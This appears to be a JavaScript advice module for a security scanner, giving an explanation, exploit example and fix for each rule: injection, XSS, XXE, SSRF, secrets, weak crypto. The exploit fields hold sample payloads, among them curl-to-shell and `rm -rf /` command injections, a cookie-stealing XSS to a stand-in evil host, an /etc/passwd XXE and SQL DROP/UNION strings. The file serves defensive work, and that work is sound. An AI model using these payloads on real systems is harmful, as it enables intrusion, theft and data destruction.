'use strict';
/**
 * aiadvice.js — local "AI reviewer" knowledge base.
 * For every finding it produces: a human explanation, root cause,
 * exploitation scenario, a concrete fix snippet, and references.
 * Deterministic, offline, shaped like a senior security engineer's notes.
 */

const ADVICE = {
  SQLI_CONCAT: {
    why: 'The SQL statement is assembled by concatenation, so the database parser cannot tell your code from user data. Anything appended becomes executable SQL grammar.',
    exploit: 'An input value of `x\'; DROP TABLE users; --` (or a blind `\' OR 1=1 --`) terminates your string early and executes the attacker\'s statement, exfiltrating or destroying data.',
    fixSnippet: `// BEFORE (vulnerable)\ndb.query("SELECT * FROM users WHERE id = " + req.query.id);\n\n// AFTER (parameterized)\ndb.query("SELECT * FROM users WHERE id = ?", [req.query.id]);`,
    refs: ['https://owasp.org/Top10/A03_2021-Injection/', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'],
  },
  SQLI_TEMPLATE: {
    why: 'Template interpolation embeds user data directly into the SQL text. Escaping is impossible to get right by hand; the parser treats the data as SQL.',
    exploit: 'A crafted value like `" OR deleted=0 UNION SELECT token FROM secrets --` is read as part of the query, dumping rows the user should never see.',
    fixSnippet: `// AFTER — placeholders, never interpolation\nawait db.query(\`SELECT * FROM orders WHERE user_id = $1\`, [userId]);`,
    refs: ['https://owasp.org/Top10/A03_2021-Injection/'],
  },
  SQLI_FSTRING: {
    why: 'f-strings interpolate at string-build time; the DB driver never sees a parameter boundary, so user data becomes SQL grammar.',
    exploit: '`email = "a@x.com" OR 1=1 --` returns every row; stacked queries can chain UPDATE/DELETE depending on driver config.',
    fixSnippet: `# AFTER\ncursor.execute("SELECT * FROM users WHERE email = %s", (email,))\n# or with SQLAlchemy:\nselect(User).where(User.email == email)`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'],
  },
  CMDI_SHELL: {
    why: 'Passing concatenated strings to exec/spawn invokes a shell that interprets metacharacters in the input as commands.',
    exploit: 'Input `file.txt; curl attacker.sh | sh` executes the attacker payload with the server process privileges — often root in containers.',
    fixSnippet: `// AFTER — arg array, no shell\nconst { execFile } = require('child_process');\nexecFile('convert', [userPath, outPath], cb);`,
    refs: ['https://owasp.org/www-community/attacks/Command_Injection'],
  },
  CMDI_SHELL_TRUE: {
    why: 'shell=True / os.system routes the command through /bin/sh; every metacharacter in user input is interpreted.',
    exploit: 'A filename of `; rm -rf /` or `$(curl evil.sh)` becomes a second command the server happily executes.',
    fixSnippet: `# AFTER\nsubprocess.run(["convert", user_path, out_path], check=True, shell=False)`,
    refs: ['https://docs.python.org/3/library/subprocess.html#security-considerations'],
  },
  EVAL_USE: {
    why: 'eval/exec compiles and runs data as code inside your process. Any path from user input to eval equals full server-side RCE.',
    exploit: 'A "calculator" input like `require("child_process").execSync("curl evil|sh")` runs instantly, in-process, with your privileges.',
    fixSnippet: `// AFTER — parse instead of evaluate\nconst value = JSON.parse(input); // data, not code\n// domain logic instead of dynamic code`,
    refs: ['https://owasp.org/www-community/attacks/Code_Injection'],
  },
  XSS_INNERHTML: {
    why: 'innerHTML parses its assignment as HTML, including <script> and event handlers. User data becomes executable DOM.',
    exploit: 'A comment field containing `<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">` runs in every viewer\'s session.',
    fixSnippet: `// AFTER\nel.textContent = userInput;               // safe sink\n// if HTML is truly needed: DOMPurify.sanitize(html)`,
    refs: ['https://owasp.org/www-community/attacks/xss/'],
  },
  DESERIALIZE_UNSAFE: {
    why: 'Pickle/yaml.load/unserialize instantiate arbitrary objects from the byte stream. Attackers craft "gadget chains" that end in code execution.',
    exploit: 'A POSTed session cookie containing a crafted pickle runs commands on unpickle — no other vulnerability needed.',
    fixSnippet: `# AFTER\njson.loads(data)                      # structured data only\n# yaml: yaml.safe_load(data)          # never yaml.load without SafeLoader`,
    refs: ['https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/'],
  },
  INSECURE_DESCERIALIZE_JS: {
    why: 'Backtick exec strings interpolate into a shell command line; ${userInput} is shell grammar, not an argument.',
    exploit: '`\`git log ${branch}\`` with branch "main; curl evil.sh | sh" executes the payload on the host.',
    fixSnippet: `const { execFile } = require('child_process');\nexecFile('git', ['log', branch], cb); // args stay args`,
    refs: ['https://owasp.org/www-community/attacks/Command_Injection'],
  },
  HARDCODED_SECRET: {
    why: 'Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.',
    exploit: 'A scraped or leaked repo yields live keys; bots find them within minutes of a public push.',
    fixSnippet: `// AFTER\nconst key = process.env.STRIPE_KEY;   // injected by vault/CI\n// add .env to .gitignore; rotate the exposed key NOW`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html'],
  },
  HARDCODED_AWS_KEY: {
    why: 'AKIA… literals in code are directly usable access keys. Cloud providers scan and attackers scan harder.',
    exploit: 'With the paired secret key, attackers attach IAM escalation policies and empty out the account.',
    fixSnippet: `# AFTER — instance roles / OIDC federation\n# aws iam create-role with trust policy; attach minimal policy\n# then: no static keys exist at all`,
    refs: ['https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures'],
  },
  PRIVATE_KEY_BLOCK: {
    why: 'A committed PEM private key is the credential itself. TLS/signing identity is compromised on merge.',
    exploit: 'Attacker decrypts captured traffic, impersonates your service, or signs malicious artifacts as you.',
    fixSnippet: `# AFTER\n# store in secret manager; mount at runtime\n# generate a NEW key — the old one is permanently burned`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html'],
  },
  DB_CONN_CREDENTIALS: {
    why: 'user:password@host URIs embed credentials where logs, crash traces, and APM tools routinely capture them.',
    exploit: 'One verbose error log pasted to a public issue = full database access.',
    fixSnippet: `# AFTER\nDATABASE_URL=postgres://user@host/db   # password via vault/secret store\n# or: pgpass file / IAM auth tokens`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html'],
  },
  WEAK_HASH: {
    why: 'MD5/SHA1 are collision-broken and far too fast for password storage — GPU rigs guess billions/second.',
    exploit: 'Stolen MD5 password dumps are cracked at scale in hours; identical hashes also leak logins across sites.',
    fixSnippet: `// AFTER — passwords:\nconst bcrypt = require('bcrypt');\nawait bcrypt.hash(pw, 12);\n// integrity: crypto.createHash('sha256')`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html'],
  },
  INSECURE_RANDOM: {
    why: 'Math.random / random.* are Mersenne Twister-class PRNGs: observe a few outputs and future ones are predictable.',
    exploit: 'Session tokens and reset links generated this way are brute-forceable from a handful of samples.',
    fixSnippet: `// AFTER\nconst { randomBytes, randomUUID } = require('crypto');\nconst token = randomBytes(32).toString('hex');\n# py: secrets.token_urlsafe(32)`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#glossary'],
  },
  WEAK_CIPHER_MODE: {
    why: 'ECB encrypts identical blocks identically (penguin PNG classic); DES/RC4 have effective key space far below modern needs.',
    exploit: 'ECB-encrypted payloads are block-spliced by attackers; DES falls to brute force in hours.',
    fixSnippet: `// AFTER\ncrypto.createCipheriv('aes-256-gcm', key, iv); // GCM = AEAD\n# py: cryptography.hazmat AESGCM(key)`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html'],
  },
  JWT_NONE_ALG: {
    why: 'Accepting "none" or downgradable algorithms lets tokens be re-signed without any secret.',
    exploit: 'Take a valid token, set alg:none, claim {"role":"admin"} — signature block optional.',
    fixSnippet: `// AFTER\njwt.verify(token, publicKey, { algorithms: ['RS256'] });`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html'],
  },
  SSRF_URL_INPUT: {
    why: 'The server fetches an attacker-chosen URL, so the request originates from inside your network — firewalls see it as trusted.',
    exploit: 'Target http://169.254.169.254/latest/meta-data/ to steal cloud credentials, or internal admin panels.',
    fixSnippet: `// AFTER — allowlist + resolve check\nconst u = new URL(input);\nif (!ALLOWED_HOSTS.has(u.hostname)) throw new Error('blocked');\n// resolve DNS first, reject private ranges (169.254.0.0/16, 10/8, 127/8)`,
    refs: ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
  },
  OPEN_REDIRECT: {
    why: 'Redirecting to a request-supplied URL turns your domain into the first hop of a phishing chain.',
    exploit: 'https://bank.com/logout?next=https://evil-clone.com — users see a trusted domain, then a fake login.',
    fixSnippet: `// AFTER — local paths only\nconst t = new URL(target, 'https://your.app');\nif (t.origin !== BASE_ORIGIN) t = '/';  // or use allowlist`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'],
  },
  TLS_VERIFY_OFF: {
    why: 'With verification disabled, any MITM (rogue Wi-Fi, BGP hijack, hostile proxy) presents any certificate and it is accepted.',
    exploit: 'Credentials and tokens are read in transit; payloads replaced silently.',
    fixSnippet: `# AFTER\n# python: verify=True (default) + corporate CA via certifi\n# node: do NOT set rejectUnauthorized:false — add CA bundle instead`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html'],
  },
  XXE_PARSER: {
    why: 'Default XML parsers honor DOCTYPE external entities, mixing local file reads and HTTP fetches into your parse.',
    exploit: '`<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` returns the file in the response.',
    fixSnippet: `# py — defusedxml\ndefusedxml.ElementTree.fromstring(data)\n# java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`,
    refs: ['https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'],
  },
  PATH_TRAVERSAL_JOIN: {
    why: 'User input joins a base path; ../ (or absolute paths, or NUL bytes) escape the base directory before any check.',
    exploit: 'GET /download?name=../../etc/passwd reads arbitrary files; write variants plant webshells.',
    fixSnippet: `// AFTER\nconst base = path.resolve(__dirname, 'files');\nconst target = path.resolve(base, userPath);\nif (!target.startsWith(base + path.sep)) return res.status(400).end();`,
    refs: ['https://owasp.org/www-community/attacks/Path_Traversal'],
  },
  WILDCARD_CORS: {
    why: 'Access-Control-Allow-Origin: * with credentials enabled lets any origin read authenticated responses.',
    exploit: 'evil.com JS fetches victim-session data from your API; the browser hands it over because CORS said yes.',
    fixSnippet: `// AFTER — explicit allowlist\nconst allow = ['https://app.yourdomain.com'];\ncors({ origin: (o, cb) => cb(null, allow.includes(o)), credentials: true })`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'],
  },
  PLAINTEXT_COMPARE: {
    why: '=== on secrets compares byte-by-byte with early exit; timing reveals how many leading bytes matched.',
    exploit: 'Millions of timed requests statistically reconstruct the HMAC of a signed payload.',
    fixSnippet: `// AFTER\nconst ok = crypto.timingSafeEqual(bufA, bufB);\n# py: hmac.compare_digest(a, b)`,
    refs: ['https://owasp.org/www-community/attacks/Timing_attack'],
  },
  NO_AUTH_MIDDLEWARE_HINT: {
    why: 'The route name suggests sensitive data/operations, but no authentication middleware appears in its handler chain.',
    exploit: 'Unauthenticated GET /admin/export dumps user data to anyone who guesses the URL.',
    fixSnippet: `// AFTER\napp.get('/admin/export', requireAuth, requireRole('admin'), handler);`,
    refs: ['https://owasp.org/Top10/A01_2021-Broken_Access_Control/'],
  },
  DEBUG_MODE_ON: {
    why: 'Debug mode exposes stack traces, settings, and interactive consoles (Werkzeug /debug, Django /admin traceback).',
    exploit: 'Werkzeug debugger PIN bypass → arbitrary code execution from a browser.',
    fixSnippet: `# AFTER\nDEBUG = os.getenv('DEBUG', 'false').lower() == 'true'\n# and configure generic error pages for production`,
    refs: ['https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration'],
  },
  DANGEROUS_DOM_SINK: {
    why: 'new Function() and string-arg setTimeout/setInterval compile their argument as JavaScript in global scope.',
    exploit: 'A value like "alert(document.cookie)" persisted in a queue executes in every consumer page.',
    fixSnippet: `// AFTER\nsetTimeout(() => handler(), 100);       // function, not string\n// data-driven dispatch: table of known functions, not new Function`,
    refs: ['https://owasp.org/www-community/attacks/xss/'],
  },
  POSTMESSAGE_WILDCARD: {
    why: 'targetOrigin "*" sends the message to whichever window ends up hosting the iframe, including an attacker that navigated it.',
    exploit: 'Embedded frame redirects to evil.com, then receives your token in a message event.',
    fixSnippet: `// AFTER\niframe.contentWindow.postMessage(data, 'https://app.yourdomain.com');`,
    refs: ['https://owasp.org/www-community/HTML5_Security_Cheat_Sheet'],
  },
  COOKIES_NO_HTTPONLY: {
    why: 'Without HttpOnly, document.cookie exposes the session token to any injected script.',
    exploit: 'One XSS anywhere in the app exfiltrates every active user\'s session cookie.',
    fixSnippet: `// AFTER\nres.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' });`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html'],
  },
  GIT_IN_URL: {
    why: 'CI tokens (ghp_, xox…, x-access-token) pasted into code or URLs are live credentials scoped to repos/orgs.',
    exploit: 'Clone-and-escalate: attacker reads private repos, poisons workflows, pivots to cloud roles.',
    fixSnippet: `# AFTER\ngit clone https://x-access-token:\${GH_TOKEN}@github.com/org/repo\n# token from CI secret store; add ghp_ to secret-scanning blocklist`,
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html'],
  },
  ENV_FILE_COMMITTED: {
    why: 'Tracked .env files put production secrets in history; deleting the file does not remove it from git log.',
    exploit: 'Clone the repo, `git log -p .env` — every past secret is recoverable.',
    fixSnippet: `# AFTER\necho ".env" >> .gitignore\ngit rm --cached .env   # then rotate ALL values in it`,
    refs: ['https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration'],
  },
  VERBOSE_ERROR_EXPOSE: {
    why: 'Returning err/ex objects serializes stack traces: absolute paths, SQL fragments, library versions.',
    exploit: 'Attacker maps your stack precisely: vulnerable dependency versions, internal hostnames, query shapes.',
    fixSnippet: `// AFTER\nconst id = crypto.randomUUID();\nlog.error({ err, id });            // full detail server-side\nres.status(500).json({ error: 'Internal error', ref: id });`,
    refs: ['https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration'],
  },
  SECURITY_TODO: {
    why: 'A deferred security task in comments is unmanaged risk: no owner, no deadline, no test coverage.',
    exploit: 'The shortcut taken "for now" becomes the endpoint nobody hardened when traffic arrived.',
    fixSnippet: `# AFTER\n# convert TODO → tracked issue with severity label + owner\n# add a regression test that fails until implemented`,
    refs: [],
  },
};

function adviceFor(ruleId) {
  return ADVICE[ruleId] || {
    why: 'This pattern matches a known insecure coding idiom.',
    exploit: 'Exploitability depends on whether user-controlled data can reach this code path.',
    fixSnippet: '// Review and replace with the framework\'s safe API.',
    refs: ['https://owasp.org/www-project-top-ten/'],
  };
}

module.exports = { adviceFor };
